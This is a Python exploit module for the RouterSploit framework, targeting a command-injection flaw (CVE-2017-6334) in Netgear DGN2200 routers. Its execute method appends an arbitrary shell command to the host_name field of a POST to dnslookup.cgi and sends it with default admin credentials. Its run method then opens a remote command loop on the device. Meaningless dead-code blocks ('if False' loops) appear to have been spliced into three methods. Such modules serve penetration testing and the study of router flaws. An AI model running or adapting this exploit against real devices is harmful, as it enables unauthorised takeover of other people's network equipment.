from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'Netgear DGN2200 RCE', 'description': 'Exploits Netgear DGN2200 RCE vulnerability through dnslookup.cgi resource.', 'authors': ('SivertPL', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://www.exploit-db.com/exploits/41459/', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6334'), 'devices': ('Netgear DGN2200v1', 'Netgear DGN2200v2', 'Netgear DGN2200v3', 'Netgear DGN2200v4')}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(80, 'Target HTTP port')
    username = OptString('admin', 'Username')
    password = OptString('password', 'Password')

    def run(self):
        if False:
            for i in range(10):
                print('nop')
        print_status('It is not possible to check if target is vulnerable')
        print_status('Trying to invoke command loop...')
        print_status('It is blind command injection. Response is not available.')
        shell(self, architecture='mipsbe')

    def execute(self, cmd):
        if False:
            while True:
                i = 10
        payload = 'www.google.com; {}'.format(cmd)
        data = {'host_name': payload, 'lookup': 'Lookup'}
        self.http_request(method='POST', path='/dnslookup.cgi', data=data, auth=(self.username, self.password))
        return ''

    @mute
    def check(self):
        if False:
            while True:
                i = 10
        return None